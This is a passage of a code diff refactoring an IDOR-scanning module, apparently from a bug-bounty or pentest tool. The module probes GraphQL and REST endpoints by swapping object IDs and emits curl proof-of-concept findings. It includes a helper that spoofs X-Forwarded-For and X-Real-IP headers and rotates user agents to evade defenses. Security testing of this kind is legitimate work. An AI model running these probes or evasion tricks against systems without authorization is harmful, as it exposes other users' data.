             f'{parsed.scheme}://{parsed.netloc}/graphql',
             f'{parsed.scheme}://{parsed.netloc}/api/graphql',
             f'{parsed.scheme}://{parsed.netloc}/query',
         ]
-
         for gql_url in gql_urls:
             for test_id in ['1', '2', '100', str(uuid.uuid4())]:
                 query = {'query': f'{{ user(id: "{test_id}") {{ id email username role }} }}'}
@@ -923,12 +837,13 @@ class IDORTester(BaseModule):
                     data=json.dumps(query),
                     headers={'Content-Type': 'application/json'},
                 )
-                if not resp or resp.status not in (200,):
+                if not resp or resp.status != 200:
                     continue
                 body = await resp.text()
                 sensitive, items = _contains_sensitive_data(body)
                 if sensitive and 'data' in body.lower():
-                    f = Finding(
+                    # FIX 1: only add_finding()
+                    self.add_finding(Finding(
                         module='idor',
                         title=f'[GRAPHQL] IDOR via GraphQL id argument (id={test_id})',
                         severity='High',
@@ -941,13 +856,13 @@ class IDORTester(BaseModule):
                             'in all GraphQL resolvers.'
                         ),
                         evidence={'url': gql_url, 'id': test_id, 'sensitive': items},
-                        poc=f'curl -X POST {gql_url} -H "Content-Type: application/json" '
-                            f'-d \'{json.dumps(query)}\'',
+                        poc=(
+                            f'curl -X POST {gql_url} -H "Content-Type: application/json" '
+                            f"-d '{json.dumps(query)}'"
+                        ),
                         remediation='Add per-resolver authorization checks; use persisted queries.',
                         cvss_score=7.5, bounty_score=2500, target=gql_url,
-                    )
-                    self.findings.append(f)
-                    self.add_finding(f)
+                    ))
                     break
 
     # ══════════════════════════════════════════════════════════════════════════
@@ -959,7 +874,8 @@ class IDORTester(BaseModule):
                            comparison: Dict, sensitive: bool,
                            sensitive_items: List[str], technique: str):
         severity = 'Critical' if ep.resource_type in HIGH_VALUE_RESOURCES else 'High'
-        f = Finding(
+        # FIX 1: only add_finding()
+        self.add_finding(Finding(
             module='idor',
             title=f'[{technique.upper()}] IDOR on "{ep.param_name}" — {ep.resource_type}',
             severity=severity,
@@ -977,8 +893,7 @@ class IDORTester(BaseModule):
                 f'- Text: {comparison.get("text_similarity", 0):.0%}  \n\n'
                 + (f'### Sensitive Data Detected\n`{", ".join(sensitive_items[:8])}`\n\n'
                    if sensitive else '') +
-                '### Impact\nUnauthorized access to another user\'s data. '
-                'Severity depends on resource type and exposed fields.\n\n'
+                '### Impact\nUnauthorized access to another user\'s data.\n\n'
                 '### Remediation\nEnforce per-object authorization: verify the '
                 'authenticated user owns the requested resource ID on every request.'
             ),
@@ -996,14 +911,13 @@ class IDORTester(BaseModule):
             cvss_score=9.1 if severity == 'Critical' else 7.5,
             bounty_score=3000 if severity == 'Critical' else 2000,
             target=ep.url,
-        )
-        self.findings.append(f)
-        self.add_finding(f)
+        ))
 
     def _emit_injection_finding(self, ep: ResourceEndpoint, payload: str,
                                 test_url: str, vuln_type: str,
                                 severity: str, cvss: float, bounty: int):
-        f = Finding(
+        # FIX 1: only add_finding()
+        self.add_finding(Finding(
             module='idor',
             title=f'[{vuln_type.upper()}] {vuln_type} via IDOR parameter "{ep.param_name}"',
             severity=severity,
@@ -1012,7 +926,7 @@ class IDORTester(BaseModule):
                 f'**Parameter:** `{ep.param_name}`  \n'
                 f'**Payload:** `{payload[:120]}`  \n\n'
                 '### Impact\nID-bearing parameters often lack input validation, '
-                'making them attractive injection targets in addition to IDOR.\n\n'
+                'making them attractive injection targets.\n\n'
                 '### Remediation\nValidate and sanitise all ID parameters; '
                 'use parameterised queries; encode output.'
             ),
@@ -1020,66 +934,73 @@ class IDORTester(BaseModule):
             poc=f'curl "{test_url}"',
             remediation='Validate all input; use parameterised queries and output encoding.',
             cvss_score=cvss, bounty_score=bounty, target=ep.url,
-        )
-        self.findings.append(f)
-        self.add_finding(f)
+        ))
 
     # ══════════════════════════════════════════════════════════════════════════
     #  Helpers
     # ══════════════════════════════════════════════════════════════════════════
 
     def _replace_id(self, url: str, param_name: Optional[str], new_value: str) -> str:
-        """Replace a parameter value in URL — query string or path segment."""
         parsed = urlparse(url)
         qs     = parse_qs(parsed.query)
-
         if param_name and param_name in qs:
             qs[param_name] = [new_value]
             new_query = '&'.join(f'{k}={quote(v[0], safe="")}' for k, v in qs.items())
             return parsed._replace(query=new_query).geturl()
-
-        # Replace last numeric path segment
-        new_path = re.sub(r'(/)\d+(/|$)', lambda m: m.group(1) + new_value + m.group(2), parsed.path)
+        new_path = re.sub(
+            r'(/)\d+(/|$)',
+            lambda m: m.group(1) + new_value + m.group(2),
+            parsed.path,
+        )
         return parsed._replace(path=new_path, query=parsed.query).geturl()
 
     def _evasion_headers(self) -> Dict[str, str]:
-        """IDOR-Forge evasion: rotate UA, add dummy header (no delay here — BaseModule handles it)."""
         return {
             'User-Agent': random.choice(UA_POOL),
-            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
+            'X-Forwarded-For': (
+                f'{random.randint(1,255)}.{random.randint(1,255)}'
+                f'.{random.randint(1,255)}.{random.randint(1,255)}'
+            ),
             'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.0.1',
         }
 
     def _build_patterns(self) -> List[IDORPattern]:
+        # FIX 6: each pattern now declares id_group explicitly
         return [
             IDORPattern(
                 name='Sequential Numeric ID',
                 pattern=r'[?&/](id|user_id|account_id|order_id|doc_id|file_id|invoice_id|payment_id|product_id)[=/](\d+)',
-                test_strategy='sequential', severity='Critical', bounty_score=3000, confidence=0.95,
+                test_strategy='sequential', severity='Critical', bounty_score=3000,
+                confidence=0.95, id_group=2,
             ),
             IDORPattern(
                 name='RESTful Object Reference',
                 pattern=r'/api/v?\d*/(users|orders|documents|files|accounts|invoices|payments|products|items)/(\d+|[a-f0-9\-]{36})',
-                test_strategy='rest', severity='Critical', bounty_score=3000, confidence=0.95,
+                test_strategy='rest', severity='Critical', bounty_score=3000,
+                confidence=0.95, id_group=2,
             ),
             IDORPattern(
                 name='UUID in Path',
                 pattern=r'/([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})',
-                test_strategy='uuid', severity='Medium', bounty_score=1000, confidence=0.6,
+                test_strategy='uuid', severity='Medium', bounty_score=1000,
+                confidence=0.6, id_group=1,
             ),
             IDORPattern(
                 name='Token / API Key',
                 pattern=r'[?&/](token|access_token|auth_token|api_key|session_id)[=/]([a-zA-Z0-9]{8,64})',
-                test_strategy='token', severity='High', bounty_score=2000, confidence=0.8,
+                test_strategy='token', severity='High', bounty_score=2000,
+                confidence=0.8, id_group=2,
             ),
             IDORPattern(
                 name='Hash-based ID',
                 pattern=r'[?&/](hash|checksum|md5|sha)[=/]([a-f0-9]{8,64})',
-                test_strategy='hash', severity='Medium', bounty_score=1200, confidence=0.5,
+                test_strategy='hash', severity='Medium', bounty_score=1200,
+                confidence=0.5, id_group=2,
             ),
             IDORPattern(
                 name='Numeric path segment',
                 pattern=r'/(\d{1,10})(?:/|$|\?)',
-                test_strategy='path_segment', severity='High', bounty_score=2000, confidence=0.8,
+                test_strategy='path_segment', severity='High', bounty_score=2000,
+                confidence=0.8, id_group=1,
             ),
         ]
